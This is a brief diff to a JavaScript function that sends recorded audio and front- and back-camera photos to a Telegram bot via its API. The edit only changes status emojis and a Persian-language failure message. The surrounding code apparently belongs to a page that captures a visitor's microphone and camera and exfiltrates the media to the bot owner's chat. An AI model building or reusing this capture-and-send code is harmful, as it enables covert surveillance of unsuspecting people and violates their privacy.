@@ -63,13 +63,13 @@ function sendToTelegram(audio, photoFront, photoBack) {
   if (photoBack) sendFile("sendPhoto", "photo", photoBack, "back.jpg");
 
   if (audio || photoFront || photoBack) {
-    statusText.innerText = "✅";
+    statusText.innerText = "➕️";
   } else {
-    statusText.innerText = "❌";
+    statusText.innerText = "➖️";
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: "🚫" })
+      body: JSON.stringify({ chat_id: chatId, text: "🚫 خطا یا دسترسی داده نشد." })
     });
   }
 }
